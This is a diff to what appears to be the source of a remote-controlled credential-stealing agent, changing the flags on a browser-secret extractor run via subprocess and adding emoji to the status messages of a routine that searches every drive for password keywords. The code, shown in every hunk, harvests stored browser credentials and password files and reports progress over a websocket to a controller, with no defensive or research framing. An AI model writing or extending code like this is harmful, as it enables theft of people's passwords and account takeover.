@@ -3710,11 +3710,11 @@ class Agent:
             
             await self.ws.send(json.dumps({
                 "type": "browser_creds_status",
-                "msg": "Running DumpBrowserSecrets with /b:All (30-60 seconds)..."
+                "msg": "Running DumpBrowserSecrets with /b:all /e:all (30-60 seconds)..."
             }))
             
             def run_extractor():
-                cmd = f'"{exe_path}" /b:All > "{output_file}" 2>&1'
+                cmd = f'"{exe_path}" /b:all /e:all > "{output_file}" 2>&1'
                 result = subprocess.run(
                     cmd,
                     shell=True,
@@ -5574,14 +5574,14 @@ class PasswordsInFilesSearcher:
         self.search_in_content = True
         self.search_in_filenames = True
         
-        await self.send_status(f" Starting password file search (speed: {speed_limit} files/sec)...")
-        await self.send_status(f" Searching in: file CONTENT + file NAMES")
+        await self.send_status(f"🚀 Starting password file search (speed: {speed_limit} files/sec)...")
+        await self.send_status(f"🔍 Searching in: file CONTENT + file NAMES")
         
         keywords = self.build_keywords(custom_word)
-        await self.send_status(f" Searching for {len(keywords)} keywords (including filename match)")
+        await self.send_status(f"🔍 Searching for {len(keywords)} keywords (including filename match)")
         
         drives = self.get_drives(disk_option)
-        await self.send_status(f" Scanning {len(drives)} location(s)...")
+        await self.send_status(f"📁 Scanning {len(drives)} location(s)...")
         
         total_matches = 0
         filename_matches = 0
@@ -5593,7 +5593,7 @@ class PasswordsInFilesSearcher:
                 self.is_searching = False
                 return
             
-            await self.send_status(f" Scanning: {drive}")
+            await self.send_status(f"📂 Scanning: {drive}")
             matches = await self.scan_directory(drive, keywords, max_size_mb, skip_binary)
             
 
@@ -5607,10 +5607,10 @@ class PasswordsInFilesSearcher:
         
         if not self.stop_requested and self.is_searching:
             await self.send_status(
-                f" Search completed! Found {total_matches} matches total:\n"
-                f"    Filename matches: {filename_matches}\n"
-                f"    Content matches: {content_matches}\n"
-                f"    Scanned {self.scanned_count} files total."
+                f"✅ Search completed! Found {total_matches} matches total:\n"
+                f"   📝 Filename matches: {filename_matches}\n"
+                f"   📄 Content matches: {content_matches}\n"
+                f"   📊 Scanned {self.scanned_count} files total."
             )
         
         self.is_searching = False
